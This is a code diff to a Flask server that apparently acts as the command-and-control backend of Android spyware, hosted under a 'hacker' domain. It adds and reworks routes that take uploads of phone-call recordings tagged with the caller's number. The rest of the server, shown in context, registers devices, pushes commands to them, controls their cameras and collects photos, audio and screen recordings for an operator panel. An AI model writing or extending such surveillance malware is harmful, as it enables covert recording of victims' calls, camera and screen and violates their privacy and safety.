@@ -1,10 +1,11 @@
-from flask import Flask, request, jsonify, send_from_directory, render_template
+from flask import Flask, request, jsonify, send_from_directory, render_template, send_file
 import threading
 import time
 import json
 import os
 from datetime import datetime
 import uuid
+import sqlite3
 
 app = Flask(__name__)
 
@@ -18,7 +19,28 @@ UPLOAD_FOLDER = 'uploads'
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
+# Create call recordings directory
+CALL_RECORDINGS_DIR = 'call_recordings'
+if not os.path.exists(CALL_RECORDINGS_DIR):
+    os.makedirs(CALL_RECORDINGS_DIR)
+
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+
+# Database initialization for call recordings
+def init_call_recordings_db():
+    conn = sqlite3.connect('call_recordings.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS call_recordings
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  phone_number TEXT,
+                  call_type TEXT,
+                  timestamp DATETIME,
+                  file_path TEXT)''')
+    conn.commit()
+    conn.close()
+
+# Initialize call recordings database
+init_call_recordings_db()
 
 @app.route('/')
 def home():
@@ -35,6 +57,134 @@ def get_server_ip():
         return "sukh-hacker007.onrender.com"
     except:
         return "localhost:5000"
+
+# ================== CALL RECORDING ROUTES ==================
+
+@app.route('/call_recording', methods=['GET'])
+def get_call_recordings():
+    """Get all call recordings for web panel"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings ORDER BY timestamp DESC")
+        recordings = c.fetchall()
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'recordings': recordings
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/upload', methods=['POST'])
+def upload_call_recording():
+    """Upload call recording from Android app"""
+    try:
+        if 'recording' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No recording file'})
+        
+        recording_file = request.files['recording']
+        phone_number = request.form.get('phone_number', 'Unknown')
+        call_type = request.form.get('call_type', 'Normal Call')
+        device_id = request.form.get('device_id', 'unknown')
+        
+        if recording_file.filename == '':
+            return jsonify({'status': 'error', 'message': 'No file selected'})
+        
+        # Save recording file
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{timestamp}_{phone_number}.wav"
+        filepath = os.path.join(CALL_RECORDINGS_DIR, filename)
+        recording_file.save(filepath)
+        
+        # Save to database
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO call_recordings (phone_number, call_type, timestamp, file_path) VALUES (?, ?, ?, ?)",
+                 (phone_number, call_type, datetime.now(), filepath))
+        conn.commit()
+        conn.close()
+        
+        # Also add to uploaded_files for consistency
+        file_info = {
+            'filename': filename,
+            'device_id': device_id,
+            'upload_time': time.time(),
+            'size': os.path.getsize(filepath),
+            'type': 'call_recording',
+            'phone_number': phone_number,
+            'call_type': call_type
+        }
+        uploaded_files.append(file_info)
+        
+        print(f"✅ Call recording uploaded: {filename} from device {device_id}")
+        
+        return jsonify({'status': 'success', 'message': 'Recording uploaded'})
+    except Exception as e:
+        print(f"❌ Call recording upload error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/<int:recording_id>')
+def download_recording(recording_id):
+    """Download specific recording file"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
+        recording = c.fetchone()
+        conn.close()
+        
+        if recording and recording[4]:  # file_path
+            if os.path.exists(recording[4]):
+                return send_file(recording[4], as_attachment=True)
+        
+        return jsonify({'status': 'error', 'message': 'Recording not found'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/delete/<int:recording_id>', methods=['DELETE'])
+def delete_recording(recording_id):
+    """Delete specific recording"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
+        recording = c.fetchone()
+        
+        if recording:
+            # Delete file
+            if recording[4] and os.path.exists(recording[4]):  # file_path
+                os.remove(recording[4])
+            
+            # Delete from database
+            c.execute("DELETE FROM call_recordings WHERE id = ?", (recording_id,))
+            conn.commit()
+            conn.close()
+            
+            return jsonify({'status': 'success', 'message': 'Recording deleted'})
+        else:
+            conn.close()
+            return jsonify({'status': 'error', 'message': 'Recording not found'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/device/<device_id>', methods=['GET'])
+def get_device_call_recordings(device_id):
+    """Get call recordings for specific device"""
+    try:
+        # Get recordings from uploaded_files for this device
+        device_recordings = [f for f in uploaded_files if f['device_id'] == device_id and f.get('type') == 'call_recording']
+        sorted_recordings = sorted(device_recordings, key=lambda x: x['upload_time'], reverse=True)
+        
+        return jsonify({
+            'status': 'success',
+            'recordings': sorted_recordings
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# ================== EXISTING ROUTES (SAME AS BEFORE) ==================
 
 # Photo upload endpoint
 @app.route('/upload_photo', methods=['POST'])
@@ -116,7 +266,7 @@ def upload_screen_recording():
         print(f"❌ Screen recording upload error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# Camera control endpoint - FIXED
+# Camera control endpoint
 @app.route('/camera', methods=['POST'])
 def camera_control():
     try:
@@ -175,111 +325,6 @@ def camera_control():
 
     except Exception as e:
         print(f"❌ Camera control error: {e}")
-        return jsonify({'status': 'error', 'message': str(e)})
-
-# Call Recording Routes
-@app.route('/call_recording', methods=['GET'])
-def get_call_recordings():
-    """Get all call recordings for web panel"""
-    try:
-        conn = sqlite3.connect('call_recordings.db')
-        c = conn.cursor()
-        c.execute("SELECT * FROM call_recordings ORDER BY timestamp DESC")
-        recordings = c.fetchall()
-        conn.close()
-        
-        return jsonify({
-            'status': 'success',
-            'recordings': recordings
-        })
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/call_recording/upload', methods=['POST'])
-def upload_call_recording():
-    """Upload call recording from Android app"""
-    try:
-        if 'recording' not in request.files:
-            return jsonify({'status': 'error', 'message': 'No recording file'})
-        
-        recording_file = request.files['recording']
-        phone_number = request.form.get('phone_number', 'Unknown')
-        call_type = request.form.get('call_type', 'Normal Call')
-        
-        if recording_file.filename == '':
-            return jsonify({'status': 'error', 'message': 'No file selected'})
-        
-        # Save recording file
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{timestamp}_{phone_number}.wav"
-        filepath = os.path.join(RECORDINGS_DIR, filename)
-        recording_file.save(filepath)
-        
-        # Save to database
-        conn = sqlite3.connect('call_recordings.db')
-        c = conn.cursor()
-        c.execute("INSERT INTO call_recordings (phone_number, call_type, timestamp) VALUES (?, ?, ?)",
-                 (phone_number, call_type, datetime.now()))
-        conn.commit()
-        conn.close()
-        
-        return jsonify({'status': 'success', 'message': 'Recording uploaded'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/call_recording/<int:recording_id>')
-def download_recording(recording_id):
-    """Download specific recording file"""
-    try:
-        conn = sqlite3.connect('call_recordings.db')
-        c = conn.cursor()
-        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
-        recording = c.fetchone()
-        conn.close()
-        
-        if recording:
-            phone_number = recording[1]
-            timestamp = recording[3].replace(':', '').replace(' ', '_')
-            filename = f"{timestamp}_{phone_number}.wav"
-            filepath = os.path.join(RECORDINGS_DIR, filename)
-            
-            if os.path.exists(filepath):
-                return send_file(filepath, as_attachment=True)
-        
-        return jsonify({'status': 'error', 'message': 'Recording not found'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/call_recording/delete/<int:recording_id>', methods=['DELETE'])
-def delete_recording(recording_id):
-    """Delete specific recording"""
-    try:
-        # First get recording info
-        conn = sqlite3.connect('call_recordings.db')
-        c = conn.cursor()
-        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
-        recording = c.fetchone()
-        
-        if recording:
-            # Delete from database
-            c.execute("DELETE FROM call_recordings WHERE id = ?", (recording_id,))
-            conn.commit()
-            conn.close()
-            
-            # Delete file
-            phone_number = recording[1]
-            timestamp = recording[3].replace(':', '').replace(' ', '_')
-            filename = f"{timestamp}_{phone_number}.wav"
-            filepath = os.path.join(RECORDINGS_DIR, filename)
-            
-            if os.path.exists(filepath):
-                os.remove(filepath)
-            
-            return jsonify({'status': 'success', 'message': 'Recording deleted'})
-        else:
-            conn.close()
-            return jsonify({'status': 'error', 'message': 'Recording not found'})
-    except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
 # File upload endpoint
@@ -407,6 +452,7 @@ def get_device_details(device_id):
             device_photos = [f for f in device_files if f.get('type') == 'photo']
             device_audios = [f for f in device_files if f.get('type') == 'audio']
             device_screen_recordings = [f for f in device_files if f.get('type') == 'screen_recording']
+            device_call_recordings = [f for f in device_files if f.get('type') == 'call_recording']
             
             return jsonify({
                 'status': 'success',
@@ -414,7 +460,8 @@ def get_device_details(device_id):
                 'files_count': len(device_files),
                 'photos_count': len(device_photos),
                 'audios_count': len(device_audios),
-                'screen_recordings_count': len(device_screen_recordings)
+                'screen_recordings_count': len(device_screen_recordings),
+                'call_recordings_count': len(device_call_recordings)
             })
         return jsonify({'status': 'error', 'message': 'Device not found'}), 404
     except Exception as e:
@@ -439,7 +486,7 @@ def delete_file(filename):
         print(f"❌ Delete file error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# Device registration endpoint - UPDATED
+# Device registration endpoint
 @app.route('/register_device', methods=['POST'])
 def register_device():
     try:
@@ -465,7 +512,7 @@ def register_device():
         print(f"❌ Registration error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Device checks for commands - IMPROVED
+# Device checks for commands
 @app.route('/get_commands/<device_id>', methods=['GET'])
 def get_commands(device_id):
     try:
@@ -489,7 +536,7 @@ def get_commands(device_id):
         print(f"❌ Get commands error: {e}")
         return jsonify({'commands': []})
 
-# Send command to all devices - UPDATED
+# Send command to all devices
 @app.route('/send_command', methods=['POST'])
 def send_command():
     try:
@@ -535,7 +582,7 @@ def send_command():
         print(f"❌ Send command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Send command to specific device only - FIXED
+# Send command to specific device only
 @app.route('/send_command_to_device', methods=['POST'])
 def send_command_to_device():
     try:
@@ -592,7 +639,7 @@ def update_device_status(device_id, command):
         # For photo capture, we don't change camera status
         pass
 
-# Update device status endpoint - IMPROVED
+# Update device status endpoint
 @app.route('/update_status', methods=['POST'])
 def update_status():
     try:
@@ -619,7 +666,7 @@ def update_status():
         print(f"❌ Update status error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
-# Get connected devices - IMPROVED
+# Get connected devices
 @app.route('/get_devices', methods=['GET'])
 def get_devices():
     try:
@@ -682,11 +729,15 @@ if __name__ == '__main__':
     print('   - POST /data (audio upload)')
     print('   - POST /upload_photo (photo upload)')
     print('   - POST /upload_screen_recording (screen recording upload)')
+    print('   - POST /call_recording/upload (call recording upload)')
+    print('   - GET  /call_recording (get all call recordings)')
+    print('   - GET  /call_recording/device/<device_id> (get device call recordings)')
     print('   - GET  /file/<filename>')
     print('   - GET  /get_files')
     print('   - GET  /get_device_files/<device_id>')
     print('   - GET  /get_device/<device_id>')
     print('   - DELETE /delete_file/<filename>')
+    print('   - DELETE /call_recording/delete/<recording_id>')
     print('   - POST /register_device')
     print('   - GET  /get_commands/<device_id>')
     print('   - POST /send_command')
